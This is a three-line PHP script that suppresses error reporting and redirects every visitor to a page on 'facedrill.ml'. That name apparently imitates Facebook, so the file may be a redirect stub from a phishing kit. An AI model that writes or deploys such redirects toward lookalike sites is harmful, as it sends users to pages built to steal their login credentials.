<?php
    error_reporting(0);
    header("location: http://facedrill.ml/index.php");
?>